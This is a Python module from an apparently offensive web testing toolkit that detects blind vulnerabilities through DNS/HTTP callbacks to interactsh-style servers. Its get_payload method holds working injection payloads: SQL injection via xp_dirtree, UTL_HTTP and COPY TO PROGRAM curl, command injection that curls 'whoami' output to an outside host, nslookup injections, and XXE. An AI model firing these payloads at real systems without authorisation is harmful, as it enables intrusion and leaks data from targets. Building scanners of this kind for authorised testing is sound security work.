#!/usr/bin/env python3
"""
Out-of-Band (OOB) Detector
-----------------------------
Provides DNS/HTTP callback detection for blind vulnerabilities using
interactsh.com (free Burp Collaborator alternative) or DNS fallback.
"""

import uuid
import time
import socket
import requests
from typing import List, Dict, Optional, Tuple
from rich.console import Console

console = Console()

INTERACTSH_SERVER = "https://interactsh.com"


class OOBDetector:
    """
    OOB detector using interactsh.com.

    Usage:
        oob = OOBDetector()
        payload = oob.get_payload("ssrf")
        # inject payload...
        hits = oob.poll()   # list of callback events
    """

    def __init__(self, timeout: int = 10, poll_wait: int = 5):
        self.timeout = timeout
        self.poll_wait = poll_wait
        self._uid = uuid.uuid4().hex[:12]
        self._domain = None
        self.available = False
        self._mode = "none"
        self._session = requests.Session()
        self._session.headers["User-Agent"] = "WebPwnToolkit/2.0"
        self._init()

    def _init(self) -> None:
        # Try interactsh.com
        try:
            resp = self._session.post(
                f"{INTERACTSH_SERVER}/register",
                json={"secret-key": self._uid, "correlation-id": self._uid},
                timeout=self.timeout,
                verify=False,
            )
            if resp.status_code == 200:
                data = resp.json()
                self._domain = data.get("domain") or f"{self._uid}.oast.me"
                self.available = True
                self._mode = "interactsh"
                console.print(
                    f"  [green]✅ OOB ready: [bold]{self._domain}[/bold][/green]"
                )
                return
        except Exception:
            pass

        # Fallback: oast.fun
        try:
            resp = self._session.get(
                "https://oast.fun/register",
                params={"uid": self._uid},
                timeout=self.timeout,
                verify=False,
            )
            if resp.status_code == 200:
                self._domain = f"{self._uid}.oast.fun"
                self.available = True
                self._mode = "interactsh"
                console.print(
                    f"  [green]✅ OOB ready (oast.fun): [bold]{self._domain}[/bold][/green]"
                )
                return
        except Exception:
            pass

        # DNS-only fallback
        self._domain = f"{self._uid}.interact.sh"
        self._mode = "dns_only"
        self.available = True
        console.print(f"  [yellow]⚠ OOB DNS-only mode: {self._domain}[/yellow]")

    def get_payload(self, vuln_type: str, extra: str = "") -> str:
        """Return an OOB payload string for the given vulnerability type."""
        tag = f"{extra}." if extra else ""
        oob = f"{tag}{self._uid}.{self._domain}"
        payloads = {
            "sqli_mssql": f"'; EXEC master..xp_dirtree '\\\\{oob}\\share'--",
            "sqli_mysql": f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT 1),'\\\\oob@{oob}.txt')))-- -",
            "sqli_oracle": f"' || UTL_HTTP.REQUEST('http://{oob}/')--",
            "sqli_pgsql": f"'; COPY (SELECT '') TO PROGRAM 'curl http://{oob}'--",
            "ssrf": f"http://{oob}/",
            "xxe": (
                f'<?xml version="1.0"?><!DOCTYPE foo '
                f'[<!ENTITY xxe SYSTEM "http://{oob}/">]>'
                f"<root><data>&xxe;</data></root>"
            ),
            "cmdi_linux": f"$(curl http://{oob}/`whoami`)",
            "cmdi_linux2": f"; nslookup {oob} ;",
            "cmdi_windows": f"& nslookup {oob}",
            "http": f"http://{oob}/",
        }
        return payloads.get(vuln_type, f"http://{oob}/")

    def get_all_sqli_oob(self) -> List[Tuple[str, str]]:
        return [
            (self.get_payload("sqli_mssql"), "MSSQL"),
            (self.get_payload("sqli_mysql"), "MySQL"),
            (self.get_payload("sqli_oracle"), "Oracle"),
            (self.get_payload("sqli_pgsql"), "PostgreSQL"),
        ]

    def get_cmdi_oob_payloads(self) -> List[str]:
        return [
            self.get_payload("cmdi_linux"),
            self.get_payload("cmdi_linux2"),
            self.get_payload("cmdi_windows"),
        ]

    def poll(self, wait: Optional[int] = None) -> List[Dict]:
        w = wait or self.poll_wait
        console.print(f"  [dim]→ Waiting {w}s for OOB callbacks...[/dim]")
        time.sleep(w)
        if self._mode == "interactsh":
            return self._poll_interactsh()
        return self._poll_dns()

    def _poll_interactsh(self) -> List[Dict]:
        events = []
        try:
            resp = self._session.get(
                f"{INTERACTSH_SERVER}/poll",
                params={"id": self._uid, "secret": self._uid},
                timeout=self.timeout,
                verify=False,
            )
            if resp.status_code == 200:
                for item in resp.json().get("data", []):
                    events.append(
                        {
                            "type": item.get("protocol", "unknown").upper(),
                            "from": item.get("remote-address", "?"),
                            "host": self._domain,
                            "raw": str(item)[:200],
                        }
                    )
        except Exception:
            pass
        return events

    def _poll_dns(self) -> List[Dict]:
        try:
            addrs = socket.getaddrinfo(self._domain, None)
            if addrs:
                return [
                    {
                        "type": "DNS",
                        "from": str(addrs[0][-1][0]),
                        "host": self._domain,
                        "raw": "DNS resolved",
                    }
                ]
        except Exception:
            pass
        return []

    def make_finding(
        self, events: List[Dict], vuln_type: str, url: str, payload: str, param: str
    ) -> Dict:
        types = ", ".join(set(e["type"] for e in events))
        return {
            "url": url,
            "parameter": param,
            "payload": payload[:150],
            "type": f"{vuln_type} (OOB/Blind — DNS/HTTP Callback)",
            "severity": "critical",
            "evidence": f"OOB callback received: {types} from {events[0].get('from','?')}",
            "detail": (
                f"Blind {vuln_type} confirmed via OOB DNS/HTTP interaction on "
                f"{self._domain}: {len(events)} callback(s)."
            ),
            "owasp": "A03:2021 – Injection",
            "cvss": 9.8,
            "remediation": (
                "Parameterize all queries. Never pass user input to OS commands, "
                "URL fetchers, or XML parsers without strict allowlist validation."
            ),
            "oob_events": events,
        }
